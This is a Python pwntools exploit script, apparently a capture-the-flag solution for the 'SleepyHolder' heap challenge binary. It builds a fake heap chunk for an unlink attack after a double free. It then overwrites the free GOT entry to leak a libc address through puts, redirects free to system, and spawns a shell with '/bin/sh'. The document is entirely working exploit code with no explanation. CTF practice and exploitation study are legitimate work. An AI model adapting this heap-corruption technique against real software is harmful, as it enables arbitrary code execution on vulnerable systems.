#!/usr/bin/env python3
from pwn import *
from time import sleep

exe = ELF("./SleepyHolder_patched")
libc = ELF("./libc.so.6")
context.binary = exe
context.terminal = "wt.exe -- wsl.exe -d Ubuntu-20.04 -- ".split()
context.log_level = "debug"

global io
breakpoints = '''
break *0x400df4
continue
'''+'continue\n'*7

if len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(exe.path)
else:
    io = gdb.debug(exe.path, gdbscript=breakpoints)
    
re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

def keep_secret(option,pyld):
    sla(b"Renew secret\n",b"1")
    sla(b"Big secret\n",str(option).encode())
    sla(b"secret: \n",pyld)

def wipe_secret(option):
    sla(b"Renew secret\n",b"2")
    sla(b"Big secret\n",str(option).encode())

def renew_secret(option,pyld):
    sla(b"Renew secret\n",b"3")
    sla(b"Big secret\n",str(option).encode())
    sa(b"secret: \n",pyld)

keep_secret(1, b"AAAA")
keep_secret(2, b"BBBB")
wipe_secret(1)
keep_secret(3, b"CCCC")
wipe_secret(1)

keep_secret(1, flat([
    b"gibshell",
    0x21,
    0x6020b8, 0x6020c0,
    0x20
    ]))
wipe_secret(2)

renew_secret(1, flat([
    0,
    exe.got["free"],
    0xdeadbeef,
    0x6020c0,
    0x1
    ]))

renew_secret(2, p64(exe.plt["puts"]))
renew_secret(1, p64(exe.got["puts"]))
wipe_secret(2)

libc.address = unpack(re(6),48) - libc.symbols["puts"]
log.info("Libc -> "+hex(libc.address))

renew_secret(1, flat([
    exe.got["free"],
    0xdeadbeef,
    0x6020c0,
    0x1
    ]))

renew_secret(2, p64(libc.symbols["system"]))
renew_secret(1, p64(next(libc.search(b"/bin/sh\x00"))))
wipe_secret(2)

io.interactive()